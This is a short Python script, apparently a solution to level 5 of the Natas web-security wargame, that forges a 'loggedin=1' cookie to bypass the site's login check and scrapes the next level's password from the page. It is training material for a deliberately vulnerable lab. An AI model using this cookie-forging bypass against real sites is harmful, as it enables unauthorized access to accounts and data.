import re

from natas.lib import natas_session

session, url = natas_session(5)

response = session.get(url, cookies={"loggedin": "1"})

regex = r"The password for natas6 is (.*)<"
print(re.findall(regex, response.text)[0])

